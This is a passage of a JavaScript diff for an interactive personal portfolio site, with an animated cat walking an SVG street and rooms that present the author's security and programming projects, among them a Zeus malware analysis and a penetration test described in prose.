+ '<g id="small-book"><path d="M244 556l14-10 14 10-14 6z" fill="#efe4cb" stroke="#6b2f2a" stroke-width="2"/><path d="M258 546v16" stroke="#6b2f2a" stroke-width="1.5"/></g>'+
+ '<rect x="160" y="470" width="120" height="175" fill="transparent"/>'+
+'</g>');
+
+/* the cat */
+s.push('<g id="cat" class="sat"><g id="catflip">'+
+ '<g class="walk"><path class="tail" d="M58 598c-26-6-34-34-22-58" stroke="#0b0b10" stroke-width="7" fill="none" stroke-linecap="round"/>'+
+ '<ellipse cx="96" cy="606" rx="46" ry="20" fill="#0b0b10"/><rect class="leg a" x="62" y="612" width="9" height="28" rx="4" fill="#0b0b10"/><rect class="leg b" x="78" y="612" width="9" height="28" rx="4" fill="#0b0b10"/><rect class="leg b" x="112" y="612" width="9" height="28" rx="4" fill="#0b0b10"/><rect class="leg a" x="126" y="612" width="9" height="28" rx="4" fill="#0b0b10"/>'+
+ '<circle cx="146" cy="588" r="18" fill="#0b0b10"/><path d="M134 576l2-18 10 12zM152 570l10-12 2 18z" fill="#0b0b10"/><ellipse class="eye" cx="152" cy="586" rx="3.6" ry="3" fill="#f3d02b"/><ellipse class="eye" cx="141" cy="586" rx="3.2" ry="3" fill="#f3d02b"/></g>'+
+ '<g class="sit"><path class="tail" d="M70 638c-30 4-36-18-22-30" stroke="#0b0b10" stroke-width="7" fill="none" stroke-linecap="round"/><path d="M70 640c-6-30 0-60 26-70 26 8 32 40 26 70z" fill="#0b0b10"/><circle cx="96" cy="560" r="19" fill="#0b0b10"/><path d="M82 548l1-20 12 12zM98 540l12-12 1 20z" fill="#0b0b10"/><ellipse class="eye" cx="89" cy="558" rx="3.6" ry="3.2" fill="#f3d02b"/><ellipse class="eye" cx="103" cy="558" rx="3.6" ry="3.2" fill="#f3d02b"/></g>'+
+'</g></g>');
+
+var world=document.getElementById('world');
+world.setAttribute('viewBox','0 0 '+W+' '+H);
+world.insertAdjacentHTML('beforeend',s.join(''));
+
+/* ---------- walking ---------- */
+var street=document.getElementById('street'), cat=document.getElementById('cat'), flip=document.getElementById('catflip');
+var backG=document.getElementById('back'), hint=document.getElementById('hint'), prompt=document.getElementById('prompt');
+var catX=90, dir=1, held=0, target=null, pending=null, lastMove=0, scale=1, camX=0, vis=1200, nearP=null;
+var SPEED=300, AUTO=520;
+
+function layout(){
+  scale=street.clientHeight/H; vis=street.clientWidth/scale;
+  world.style.width=(W*scale)+'px'; world.style.height=street.clientHeight+'px';
+  render();
+}
+function clamp(v,a,b){return Math.max(a,Math.min(b,v))}
+function render(){
+  catX=clamp(catX,40,W-60);
+  camX=clamp(catX-vis*.42,0,Math.max(0,W-vis));
+  world.style.transform='translateX('+(-camX*scale)+'px)';
+  backG.setAttribute('transform','translate('+(camX*.55).toFixed(1)+' 0)');
+  cat.setAttribute('transform','translate('+(catX-96).toFixed(1)+' 0)');
+  flip.setAttribute('transform',dir<0?'translate(192 0) scale(-1 1)':'');
+  /* nearest place */
+  var best=null,bd=1e9;
+  PLACES.forEach(function(p){var d=Math.abs(p.x-catX);if(d<bd){bd=d;best=p}});
+  var np=(bd<90&&best.id!=='board')?best:null;
+  if(np!==nearP){
+    if(nearP){var o=document.getElementById(nearP.id==='reader'?'reader':'d-'+nearP.id);o&&o.classList.remove('near')}
+    nearP=np;
+    if(nearP){var e=document.getElementById(nearP.id==='reader'?'reader':'d-'+nearP.id);e&&e.classList.add('near')}
+    prompt.hidden=!nearP;
+    if(nearP){prompt.textContent=nearP.id==='reader'?'READ HIS BOOK':nearP.id==='roof'?'GO UP':'GO IN';prompt.classList.add('on')}
+    markMap(best);
+  }
+  if(nearP){
+    var py=(nearP.id==='reader'?455:nearP.kind==='stairs'?GROUND-298:nearP.kind==='nook'?GROUND-206:nearP.kind==='shop'?338:GROUND-(nearP.tall?176:156)-66);
+    prompt.style.left=((nearP.x-camX)*scale)+'px'; prompt.style.top=(py*scale)+'px';
+  }
+}
+var lastT=0;
+function tick(t){
+  var dt=Math.min(.05,(t-(lastT||t))/1000); lastT=t;
+  var moving=false;
+  if(held){catX+=held*SPEED*dt;dir=held;moving=true;target=null;pending=null}
+  else if(target!==null){
+    var d=target-catX;
+    if(Math.abs(d)<6){catX=target;target=null;if(pending){var p=pending;pending=null;window.ALLEY.enter(p)}}
+    else{var stp=Math.sign(d)*Math.min(Math.abs(d),AUTO*dt);catX+=stp;dir=Math.sign(d);moving=true}
+  }
+  if(moving){lastMove=t;cat.classList.add('walking');cat.classList.remove('sat');hint.classList.add('gone');render()}
+  else if(t-lastMove>700){cat.classList.remove('walking');cat.classList.add('sat')}
+  else cat.classList.remove('walking');
+  requestAnimationFrame(tick);
+}
+function walkTo(x,thenEnter){
+  if(reduce){catX=x;render();if(thenEnter)window.ALLEY.enter(thenEnter);return}
+  target=x; pending=thenEnter||null;
+}
+window.ALLEY.walkTo=walkTo;
+window.ALLEY.place=function(id){var p=byId[id];if(p){catX=p.x;target=null;pending=null;render()}};
+
+document.addEventListener('keydown',function(e){
+  if(document.querySelector('.room:not([hidden])')||!document.getElementById('veil').hidden)return;
+  var tag=(e.target&&e.target.tagName)||'';if(tag==='INPUT'||tag==='TEXTAREA')return;
+  var r=street.getBoundingClientRect(); if(r.bottom<0||r.top>innerHeight)return;
+  if(e.key==='ArrowRight'||e.key==='d'||e.key==='D'){held=1;e.preventDefault()}
+  else if(e.key==='ArrowLeft'||e.key==='a'||e.key==='A'){held=-1;e.preventDefault()}
+  else if((e.key==='Enter'||e.key==='ArrowUp'||e.key===' ')&&nearP&&!(e.target.closest&&e.target.closest('.door,button,a'))){e.preventDefault();window.ALLEY.enter(nearP.id)}
+});
+document.addEventListener('keyup',function(e){if(['ArrowRight','ArrowLeft','d','D','a','A'].indexOf(e.key)>-1)held=0});
+window.addEventListener('blur',function(){held=0});
+function hold(btn,v){
+  btn.addEventListener('pointerdown',function(e){e.preventDefault();held=v;btn.setPointerCapture&&btn.setPointerCapture(e.pointerId)});
+  ['pointerup','pointercancel','pointerleave'].forEach(function(ev){btn.addEventListener(ev,function(){held=0})});
+  btn.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();catX+=v*120;dir=v;render()}});
+}
+hold(document.getElementById('goL'),-1); hold(document.getElementById('goR'),1);
+
+/* drag the street, or tap the ground / a door */
+var dragX=null, dragged=false, downDoor=null;
+street.addEventListener('pointerdown',function(e){
+  if(e.target.closest('.pad,.prompt,a'))return;
+  dragX=e.clientX; dragged=false; downDoor=e.target.closest('.door');
+});
+street.addEventListener('pointermove',function(e){
+  if(dragX===null)return;
+  var dx=e.clientX-dragX;
+  if(Math.abs(dx)>6){dragged=true}
+  if(dragged){catX-=dx/scale*1.1;dir=dx<0?1:-1;dragX=e.clientX;target=null;pending=null;lastMove=performance.now();cat.classList.add('walking');cat.classList.remove('sat');hint.classList.add('gone');render()}
+});
+street.addEventListener('pointerup',function(e){
+  if(dragX===null)return; var wasDrag=dragged; dragX=null;
+  if(wasDrag)return;
+  if(e.target.closest('.pad,.prompt,a'))return;
+  var d=downDoor||e.target.closest('.door'); downDoor=null;
+  if(d){var id=d.getAttribute('data-id');var p=byId[id];
+    if(Math.abs(p.x-catX)<40) window.ALLEY.enter(id); else walkTo(p.x,id); return}
+  var r=street.getBoundingClientRect();
+  walkTo(camX+(e.clientX-r.left)/scale);
+});
+street.addEventListener('pointercancel',function(){dragX=null});
+world.addEventListener('keydown',function(e){
+  var d=e.target.closest&&e.target.closest('.door');
+  if(d&&(e.key==='Enter'||e.key===' ')){e.preventDefault();var id=d.getAttribute('data-id');catX=byId[id].x;render();window.ALLEY.enter(id)}
+});
+world.addEventListener('focusin',function(e){var d=e.target.closest&&e.target.closest('.door');if(d&&d.matches(':focus-visible')&&dragX===null){catX=byId[d.getAttribute('data-id')].x;target=null;pending=null;render()}});
+prompt.addEventListener('click',function(){if(nearP)window.ALLEY.enter(nearP.id)});
+/* trackpads that scroll sideways walk the cat */
+street.addEventListener('wheel',function(e){if(Math.abs(e.deltaX)>Math.abs(e.deltaY)){e.preventDefault();catX+=e.deltaX*1.2;dir=e.deltaX>0?1:-1;lastMove=performance.now();cat.classList.add('walking');cat.classList.remove('sat');render()}},{passive:false});
+
+/* ---------- the map ---------- */
+var mapOl=document.getElementById('map');
+PLACES.forEach(function(p){
+  var li=document.createElement('li');
+  li.innerHTML='<button type="button" data-id="'+p.id+'"><span class="dot"></span><span class="lbl">'+esc(p.label)+'</span><span class="yr">'+esc(p.yr||'·')+'</span></button>';
+  mapOl.appendChild(li);
+});
+mapOl.addEventListener('click',function(e){var b=e.target.closest('button');if(!b)return;var p=byId[b.getAttribute('data-id')];
+  street.scrollIntoView({behavior:reduce?'auto':'smooth',block:'nearest'});walkTo(p.x)});
+function markMap(p){mapOl.querySelectorAll('button').forEach(function(b){var on=b.getAttribute('data-id')===p.id;b.setAttribute('aria-current',on?'true':'false');b.parentNode.classList.toggle('cur',on)})}
+
+window.addEventListener('resize',layout);
+layout();
+if(!reduce){catX=-60;target=150;}else{catX=150}
+render();
+requestAnimationFrame(tick);
 })();
 </script>
+<script>
+/* ================= ROOMS, THE BOOK, AND ROUTING ================= */
+(function(){
+'use strict';
+var A=window.ALLEY, reduce=window.matchMedia&&window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+var $=function(id){return document.getElementById(id)};
+var fade=$('fade'), roomCat=$('room-cat'), current=null, lastFocus=null, inited={};
 
+/* generic interior behind every room: plaster wall, two arched windows, a lamp, a floor */
+function interior(svg){
+  var wall=svg.dataset.wall, floor=svg.dataset.floor, win=svg.dataset.win, sky=svg.dataset.sky;
+  svg.setAttribute('viewBox','0 0 1200 800'); svg.setAttribute('preserveAspectRatio','xMidYMid slice');
+  var o='<rect width="1200" height="800" fill="'+wall+'"/>';
+  if(sky){
+    var st='';for(var i=0;i<120;i++){st+='<circle cx="'+((i*397)%1200)+'" cy="'+((i*233)%560)+'" r="'+(i%5===0?1.6:.9)+'" fill="#ece3cf" opacity="'+(.3+(i%7)/10)+'"/>'}
+    o+=st+'<path d="M590 40a30 30 0 1 0 27 45 24 24 0 1 1-27-45z" fill="#ece3cf" opacity=".85"/>';
+    o+='<rect y="640" width="1200" height="160" fill="'+floor+'"/><path d="M0 640h1200" stroke="#2a2f45" stroke-width="3"/>';
+    o+='<g fill="#1a1e30"><path d="M0 640V560h160v80z"/><path d="M200 640V520a60 60 0 0 1 120 0v120z"/><rect x="860" y="470" width="20" height="170"/><path d="M852 474h36l-18-30z"/><path d="M940 640V560a70 70 0 0 1 140 0v80z"/></g>';
+    o+='<g stroke="#8f7f64" stroke-width="5" fill="none"><path d="M60 640V600M60 600h1080M1140 600v40"/></g>';
+  } else {
+    o+='<rect y="610" width="1200" height="190" fill="'+floor+'"/><path d="M0 610h1200" stroke="#00000055" stroke-width="6"/>';
+    o+='<rect y="586" width="1200" height="24" fill="#00000022"/>';
+    [180,1020].forEach(function(x){
+      o+='<path d="M'+(x-70)+' 470V230a70 70 0 0 1 140 0v240z" fill="#0d0f1a"/>';
+      o+='<path d="M'+(x-70)+' 470V230a70 70 0 0 1 140 0v240z" fill="'+win+'" opacity=".16"/>';
+      o+='<path d="M'+x+' 160v310M'+(x-70)+' 330h140" stroke="#00000066" stroke-width="5"/>';
+      o+='<path d="M'+(x-82)+' 470V228a82 82 0 0 1 164 0v242" fill="none" stroke="#00000033" stroke-width="10"/>';
+    });
+    o+='<path d="M600 0v90" stroke="#00000066" stroke-width="3"/><path d="M582 90h36l8 28-8 40h-36l-8-40z" fill="#f1b75a" opacity=".85"/><circle cx="600" cy="130" r="160" fill="#f1b75a" opacity=".06"/>';
+  }
+  svg.innerHTML=o;
+}
+
+function setTitle(id){document.title=id?(document.querySelector('#r-'+id+' h2').textContent+' · Zain\'s Alley'):'Zain\'s Alley'}
+function enter(id,fromHash){
+  if(id==='reader'){openBook(0);return}
+  if(id==='board')return;
+  var room=$('r-'+id); if(!room)return;
+  lastFocus=document.activeElement;
+  A.place(id);
+  var d=$('d-'+id); if(d&&!reduce)d.classList.add('opening');
+  if(!fromHash&&location.hash!=='#'+id){history.pushState({room:id},'','#'+id)}
+  var show=function(){
+    if(current&&current!==room)current.hidden=true;
+    if(!inited[id]){var bk=room.querySelector('svg.back');bk&&interior(bk);ROOMS[id]&&ROOMS[id](room);inited[id]=1}
+    room.hidden=false; room.scrollTop=0; current=room; document.body.style.overflow='hidden';
+    roomCat.toggleAttribute('hidden',id==='cat');
+    setTitle(id);
+    var lv=room.querySelector('[data-leave]'); lv&&lv.focus({preventScroll:true});
+    fade.classList.remove('on');
+    if(d)d.classList.remove('opening');
+    ON[id]&&ON[id](room);
+  };
+  if(reduce){show();return}
+  setTimeout(function(){fade.classList.add('on');setTimeout(show,420)},280);
+}
+function leave(fromHash){
+  if(!current)return;
+  var room=current;
+  var done=function(){room.hidden=true;current=null;roomCat.setAttribute('hidden','');document.body.style.overflow='';setTitle(null);fade.classList.remove('on');
+    var id=room.id.slice(2);var d=$('d-'+id);if(d){d.focus({preventScroll:true})}else if(lastFocus&&lastFocus.focus)lastFocus.focus({preventScroll:true});
+    OFF[id]&&OFF[id]()};
+  if(!fromHash&&location.hash){history.pushState({},'',location.pathname+location.search)}
+  if(reduce){done();return}
+  fade.classList.add('on'); setTimeout(done,380);
+}
+A.enter=enter;
+document.addEventListener('click',function(e){if(e.target.closest('[data-leave]'))leave()});
+document.addEventListener('keydown',function(e){if(e.key==='Escape'&&current&&$('veil').hidden)leave()});
+window.addEventListener('popstate',route);
+function route(){var id=location.hash.slice(1);if(id&&$('r-'+id)){enter(id,true)}else if(current){leave(true)}}
+
+/* ---------------- the old man's book ---------------- */
+var pages=[
+ {id:'airport',t:'Airport Management System',w:'Nov 2024',f:'Programming · Java',x:'A desktop app in Java with a JavaFX interface that schedules departures and landings for private, commercial and cargo planes, loads flights from CSV into its own queue, and talks to a small socket server.'},
+ {id:'zerotrust',t:'Zero Trust on AWS',w:'Sep – Dec 2025',f:'Cloud security and risk',x:'A team of five tested a Zero Trust risk plan against AWS’s core services, then added a Business Impact Analysis and a Business Continuity Plan aligned with ISO 22301 and NIST SP 800-34. I wrote the abstract, introduction and conclusion.'},
+ {id:'archive',t:'Genealogy websites and the law',w:'Sep – Dec 2025',f:'Research, law and policy',x:'A 41-page paper on DNA and family-tree sites: how they collect genetic data, who else uses it, and how the law protects it, or fails to, in the US, the UAE and eight more countries. I am the first author.'},
+ {id:'zeus',t:'Zeus banking Trojan',w:'Jan – Apr 2026',f:'Malware analysis',x:'A team of five took a Zeus/ZBot sample from MalwareBazaar and analysed it statically in Ghidra and dynamically inside an isolated sandbox.'},
+ {id:'zelto',t:'ZELTO HR',w:'Jan – Apr 2026',f:'Penetration testing',x:'As team lead, I built a fake HR company with my team of five and broke into it. Eleven vulnerabilities, from SMS phishing and a debug-mode APK to JWT algorithm confusion, SSRF and a printer left on its default password.'},
+ {id:'lostfound',t:'Campus Lost & Found',w:'Feb – Apr 2026',f:'Web security',x:'A lost-and-found site for students, built twice in PHP and MySQL: once open to five attacks, once with every one of them fixed and re-tested in Burp Suite.'},
+ {id:'ransom',t:'Ransomware at XYZ Corporation',w:'Jan – Apr 2026',f:'Incident response and disaster recovery',x:'A bank in three cities, 60% of its databases encrypted after 21 days of an attacker inside. With a team of five I wrote its incident response, disaster recovery and continuity plans.'},
+ {id:'cipher',t:'Hybrid cipher',w:'Sep 2026 –',f:'Cryptography',x:'A cipher in C mixing Caesar and monoalphabetic blocks with a rotating key table. I built the decryption algorithm, which recovers every shift without guessing.'},
+ {id:'qsoc',t:'QuantumSOC',w:'Sep 2026 –',f:'SOC and post-quantum cryptography',x:'My graduation project: a testbed where a real TLS 1.3 handshake runs on ML-KEM-768 and ML-DSA-65, monitored in Splunk, to measure how ready a SOC is for quantum computers.'},
+ {id:'cyberus',t:'Cyberus Academy',w:'Sep 2026 –',f:'AI and security training',x:'At Draveron: the AI coach of a cybersecurity training platform, which writes phishing and chat attack scenarios and checks them before learners see them.'}
+];
+var pi=0, toc=$('toc'), veil=$('veil'), bookEl=$('the-book'), bookFocus=null;
+toc.innerHTML=pages.map(function(p,k){return '<li><button type="button" data-k="'+k+'">'+p.t+'</button></li>'}).join('');
+function show(k){
+  pi=(k+pages.length)%pages.length; var p=pages[pi];
+  $('p-when').textContent=p.w; $('p-title').textContent=p.t; $('p-field').textContent=p.f; $('p-text').textContent=p.x;
+  $('p-num').textContent=(pi+1)+' of '+pages.length;
+  toc.querySelectorAll('button').forEach(function(b){b.setAttribute('aria-current',+b.dataset.k===pi?'true':'false')});
+  var r=bookEl.querySelector('.page.right'); r.classList.remove('flip'); void r.offsetWidth; if(!reduce) r.classList.add('flip');
+}
+function openBook(k){
+  bookFocus=document.activeElement; show(typeof k==='number'?k:pi);
+  var sb=$('small-book').getBoundingClientRect(); veil.hidden=false;
+  var bb=bookEl.getBoundingClientRect();
+  if(!reduce&&bookEl.animate&&sb.width){
+    var dx=(sb.left+sb.width/2)-(bb.left+bb.width/2), dy=(sb.top+sb.height/2)-(bb.top+bb.height/2);
+    bookEl.animate([{transform:'translate('+dx+'px,'+dy+'px) scale(.04)',opacity:.4},{transform:'none',opacity:1}],{duration:650,easing:'cubic-bezier(.2,.7,.2,1)'});
+    veil.animate([{opacity:0},{opacity:1}],{duration:400});
+  }
+  $('close').focus();
+}
+function closeBook(){veil.hidden=true; if(bookFocus&&bookFocus.focus) bookFocus.focus({preventScroll:true})}
+toc.addEventListener('click',function(e){var b=e.target.closest('button');if(b)show(+b.dataset.k)});
+$('prev').onclick=function(){show(pi-1)}; $('next').onclick=function(){show(pi+1)};
+$('close').onclick=closeBook;
+$('p-go').onclick=function(){var id=pages[pi].id;closeBook();$('street').scrollIntoView({behavior:reduce?'auto':'smooth',block:'nearest'});A.walkTo(A.byId[id].x)};
+veil.addEventListener('click',function(e){if(e.target===veil)closeBook()});
+document.addEventListener('keydown',function(e){if(veil.hidden)return;if(e.key==='Escape')closeBook();if(e.key==='ArrowRight')show(pi+1);if(e.key==='ArrowLeft')show(pi-1)});
+$('ask').onclick=function(){$('street').scrollIntoView({behavior:reduce?'auto':'smooth',block:'nearest'});setTimeout(function(){openBook(0)},reduce?0:350)};
+
+/* ================= each room ================= */
+var ROOMS={}, ON={}, OFF={};
+var timers={};
+function clearT(id){(timers[id]||[]).forEach(function(t){clearInterval(t);clearTimeout(t)});timers[id]=[]}
+function keep(id,t){(timers[id]=timers[id]||[]).push(t)}
+
+/* ---- Airport ---- */
+ROOMS.airport=function(){
+  var F=[['FX1234','Cargo','Boeing','12:30 AM','3:00 AM'],['EK202','Commercial','Airbus','1:30 AM','3:40 AM'],['FX215','Cargo','Antonov','10:30 AM','2:00 PM'],['EJ4567','Private','Cessna','2:30 AM','4:40 AM'],['EK001','Commercial','Boeing','12:30 AM','10:00 PM'],['EJ123','Private','Gulfstream','8:30 PM','11:00 PM'],['FX9876','Cargo','Lockheed Martin','11:30 AM','4:00 AM'],['VJT9143','Private','Bombardier','12:30 AM','3:00 AM'],['LXJ534','Private','Embraer','3:30 AM','5:30 AM']];
+  function mins(t){var m=t.trim().match(/(\d+):(\d+)\s*(AM|PM)/);var h=+m[1]%12+(m[3]==='PM'?12:0);return h*60+ +m[2]}
+  F.sort(function(a,b){return mins(a[3])-mins(b[3])});
+  var rows=$('ap-rows'), taxi=$('ap-taxi'), q=[], gone={};
+  function draw(){
+    rows.innerHTML=F.map(function(f){var st=gone[f[0]]?'DEPARTED':(q[0]&&q[0][0]===f[0]?'BOARDING':(q.indexOf(f)>-1?'IN QUEUE':'SCHEDULED'));
+      return '<tr class="'+(gone[f[0]]?'gone':st==='BOARDING'?'next':'')+'"><td>'+f[0]+'</td><td>'+f[1].toUpperCase()+'</td><td>'+f[2].toUpperCase()+'</td><td>'+f[3]+'</td><td>'+f[4]+'</td><td>'+st+'</td></tr>'}).join('');
+    taxi.innerHTML=q.map(function(f,i){return '<div class="plane" data-f="'+f[0]+'" style="left:'+(i*56)+'px"><svg viewBox="0 0 46 30" aria-hidden="true"><path d="M2 16h30l10-6h3l-5 7 5 7h-3l-10-6H2z" fill="'+(f[1]==='Cargo'?'#c99a2e':f[1]==='Private'?'#e9e4d6':'#7fb3c9')+'"/><path d="M16 16l-6-12h4l10 12zM16 17l-6 12h4l10-12z" fill="#a8977a"/></svg><span class="tag">'+f[0]+'</span></div>'}).join('');
+    $('ap-go').disabled=!q.length;
+    $('ap-load').textContent=(Object.keys(gone).length===F.length)?'LOAD AGAIN':'LOAD TO THE QUEUE';
+  }
+  $('ap-load').onclick=function(){ if(Object.keys(gone).length===F.length){gone={}} q=F.filter(function(f){return !gone[f[0]]}); draw()};
+  $('ap-go').onclick=function(){
+    if(!q.length)return; var f=q[0]; var el=taxi.querySelector('.plane');
+    if(el&&!reduce){el.classList.add('up')}
+    setTimeout(function(){gone[f[0]]=1;q.shift();draw()},reduce?0:900);
+  };
+  draw();
+};
+
+/* ---- Zero Trust ---- */
+ROOMS.zerotrust=function(){
+  var G=['IDENTITY','MFA','DEVICE','LEAST PRIVILEGE','LOGGED'], wrap=$('zt-gates');
+  G.forEach(function(g){wrap.insertAdjacentHTML('beforeend','<div class="gate"><svg viewBox="0 0 58 74" aria-hidden="true"><path class="g" d="M6 72V30a23 23 0 0 1 46 0v42" fill="none" stroke="#a8977a" stroke-width="5"/><path d="M14 72V34a15 15 0 0 1 30 0v38" fill="#0d0f1a"/></svg><b>'+g+'</b></div>')});
+  var gates=wrap.querySelectorAll('.gate'), tok=$('zt-token'), v=$('zt-verdict'), busy=false;
+  function run(fail,msg){
+    if(busy)return; busy=true; clearT('zt');
+    gates.forEach(function(g){g.classList.remove('ok','no')}); v.textContent=''; v.className='verdict mono';
+    var i=0;
+    function next(){
+      var g=gates[i]; var r=g.getBoundingClientRect(), w=wrap.getBoundingClientRect();
+      tok.style.left=(r.left-w.left+r.width/2-13)+'px';
+      keep('zt',setTimeout(function(){
+        if(i===fail){g.classList.add('no');v.textContent=msg;v.classList.add('no');busy=false;return}
+        g.classList.add('ok'); i++;
+        if(i<gates.length) next(); else {v.textContent=msg;v.classList.add('ok');busy=false}
+      },reduce?0:550));
+    }
+    tok.style.left='0px'; keep('zt',setTimeout(next,reduce?0:200));
+  }
+  $('zt-good').onclick=function(){run(-1,'ALLOW · s3:GetObject on the HR reports bucket · written to CloudTrail')};
+  $('zt-bad').onclick=function(){run(1,'DENY · the password was right, the MFA wasn\'t · alert raised')};
+  $('zt-wide').onclick=function(){run(3,'DENY · asked for s3:* on every bucket · role flagged for review')};
+};
+
+/* ---- Archive ---- */
+ROOMS.archive=function(){
+  var svg=$('helix'), raf=null, mode='tree', ph=0;
+  var nodes=[[260,40],[150,110],[370,110],[90,190],[210,190],[310,190],[430,190],[260,265]];
+  var links=[[0,1],[0,2],[1,3],[1,4],[2,5],[2,6],[4,7],[5,7]];
+  function tree(){
+    var o='<g id="tree">';
+    links.forEach(function(l){var a=nodes[l[0]],b=nodes[l[1]];o+='<path d="M'+a[0]+' '+a[1]+'V'+((a[1]+b[1])/2)+'H'+b[0]+'V'+b[1]+'" stroke="#a8977a" stroke-width="2" fill="none"/>'});
+    nodes.forEach(function(n,i){o+='<circle cx="'+n[0]+'" cy="'+n[1]+'" r="'+(i===7?14:11)+'" fill="'+(i===7?'#f1b75a':'#efe4cb')+'" stroke="#6b2f2a" stroke-width="2"/>'});
+    return o+'</g>';
+  }
+  function helix(p){
+    var a='',b='',rungs='';
+    for(var x=20;x<=500;x+=6){var y1=150+Math.sin(x/38+p)*70,y2=150-Math.sin(x/38+p)*70;a+=(x===20?'M':'L')+x+' '+y1.toFixed(1);b+=(x===20?'M':'L')+x+' '+y2.toFixed(1);
+      if(x%24===20){var c=['#a3222b','#3e6b3a','#c99a2e','#2c3f73'][(x/24|0)%4];rungs+='<path d="M'+x+' '+y1.toFixed(1)+'V'+y2.toFixed(1)+'" stroke="'+c+'" stroke-width="4" opacity=".85"/>'}}
+    return rungs+'<path d="'+a+'" stroke="#efe4cb" stroke-width="4" fill="none"/><path d="'+b+'" stroke="#f1b75a" stroke-width="4" fill="none"/>';
+  }
+  function draw(){svg.innerHTML=mode==='tree'?tree():helix(ph)}
+  function spin(){ph+=.03;svg.innerHTML=helix(ph);raf=requestAnimationFrame(spin)}
+  $('ar-turn').onclick=function(){
+    if(mode==='tree'){mode='dna';this.textContent='BACK TO THE FAMILY TREE';if(reduce){draw()}else{cancelAnimationFrame(raf);spin()}}
+    else{mode='tree';this.textContent='SEND A SAMPLE';cancelAnimationFrame(raf);draw()}
+  };
+  OFF.archive=function(){cancelAnimationFrame(raf)};
+  ON.archive=function(){if(mode==='dna'&&!reduce){cancelAnimationFrame(raf);spin()}};
+  draw();
+  var C=[
+   ['United States',['No single federal genetic privacy law','GINA: covers health insurance and employment only','State genetic privacy laws fill some gaps','The FTC acts on misleading practices']],
+   ['UAE',['Federal Decree-Law No. 45 of 2021 on personal data','Dubai Health Authority standards for genetic and genomic data','Federal Decree-Law on countering rumours and cybercrimes']],
+   ['Hungary',['GDPR, with genetic data as a special category','Impact assessments required by the data authority','A forensic DNA elimination database']],
+   ['China',['Personal Information Protection Law (2021)','Regulations on Human Genetic Resources (2019)','Data Security Law (2021)']],
+   ['Israel',['Genetic Information Law, 2000','Paternity and family-relationship tests through official channels','DNA and citizenship under the Law of Return']],
+   ['Brazil',['LGPD (2018): genetic data is sensitive','Rules for sending personal data abroad (2023)']],
+   ['Singapore',['Personal Data Protection Act','Human Biomedical Research Act','Health Sciences Authority rules for genetic testing']],
+   ['Rwanda',['Law on personal data and privacy (2021)','A national identity system tied to health data','National ethics committee review']],
+   ['Hong Kong',['Personal Data (Privacy) Ordinance','DNA samples taken from people arrested (2020)']],
+   ['Iceland',['Biobanks and Health Databanks Act','Health Records Act','A national registry and a famous genetic database debate']]
+  ];
+  var cab=$('ar-cab'), card=$('ar-card');
+  cab.innerHTML=C.map(function(c,i){return '<button class="drawer" aria-pressed="false" data-i="'+i+'">'+c[0]+'</button>'}).join('');
+  cab.addEventListener('click',function(e){var b=e.target.closest('.drawer');if(!b)return;
+    cab.querySelectorAll('.drawer').forEach(function(x){x.setAttribute('aria-pressed',x===b?'true':'false')});
+    var c=C[+b.dataset.i]; card.innerHTML='<h3>'+c[0]+'</h3><ul>'+c[1].map(function(l){return '<li>'+l+'</li>'}).join('')+'</ul>';
+    if(!reduce&&card.animate)card.animate([{opacity:0,transform:'rotate(-.6deg) translateY(8px)'},{opacity:1,transform:'rotate(-.6deg)'}],{duration:300})});
+};
+
+/* ---- Zeus ---- */
+ROOMS.zeus=function(){
+  var svg=$('zeus-case');
+  svg.innerHTML='<rect x="40" y="300" width="380" height="26" fill="#3b2a1c"/><rect x="60" y="40" width="340" height="262" fill="#9bc7d81a" stroke="#cfe3ec66" stroke-width="3"/><path d="M80 52l40 240M300 52l60 240" stroke="#ffffff14" stroke-width="10"/>'+
+   '<g id="horse"><rect x="150" y="270" width="16" height="30" fill="#6b4a2e"/><rect x="186" y="270" width="16" height="30" fill="#6b4a2e"/><rect x="262" y="270" width="16" height="30" fill="#6b4a2e"/><rect x="298" y="270" width="16" height="30" fill="#6b4a2e"/>'+
+   '<rect x="130" y="170" width="200" height="104" rx="18" fill="#8a5c34" stroke="#4f3823" stroke-width="3"/><path d="M130 196h200M130 222h200M130 248h200" stroke="#6b4a2e" stroke-width="2"/>'+
+   '<path d="M300 176l40-90 34 10-14 50-30 34z" fill="#8a5c34" stroke="#4f3823" stroke-width="3"/><path d="M340 86l6-22 10 18M330 90c-10-6-16-16-16-26" stroke="#4f3823" stroke-width="5" fill="none"/><circle cx="352" cy="104" r="4" fill="#1a1410"/>'+
+   '<path d="M130 190c-30 0-40 30-34 60" stroke="#4f3823" stroke-width="8" fill="none" stroke-linecap="round"/>'+
+   '<g id="hatch" style="transform-box:fill-box;transform-origin:center bottom;transition:transform .6s"><rect x="200" y="200" width="60" height="44" fill="#6b4a2e" stroke="#3b2a1c" stroke-width="2"/><circle cx="252" cy="222" r="3" fill="#d9a441"/></g>'+
+   '<rect x="150" y="300" width="164" height="10" fill="#4f3823"/><circle cx="160" cy="315" r="9" fill="#3b2a1c"/><circle cx="304" cy="315" r="9" fill="#3b2a1c"/></g>'+
+   '<g id="glowin" opacity="0"><rect x="203" y="203" width="54" height="38" fill="#e9897f"/><text x="230" y="227" text-anchor="middle" font-family="IBM Plex Mono,monospace" font-size="10" fill="#1a1410">0x4D5A</text></g>';
+  var opened=false;
+  function open(){
+    if(opened)return; opened=true;
+    var h=$('hatch'); h.style.transform='perspective(300px) rotateX(-80deg)'; $('glowin').setAttribute('opacity','1');
+    $('zeus-inside').hidden=false; $('zeus-hint').textContent='Inside: what the sample really does.'; svg.setAttribute('aria-label','The Trojan horse, opened');
+    showFn(0); if(!reduce)$('zeus-inside').scrollIntoView({behavior:'smooth',block:'start'});
+  }
+  svg.addEventListener('click',open); svg.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();open()}});
+  var FN=[
+    ['FUN_privilege_check','A privilege-check routine. It reads the process token (a TOKEN_INFORMATION structure) to see what rights it has before doing anything risky.','<span class="c">// reconstructed, in plain terms</span>\nif (GetTokenInformation(token, ..., &amp;info)) {\n    if (<span class="k">has_admin_rights</span>(info)) { ... }\n    else { ... }\n}'],
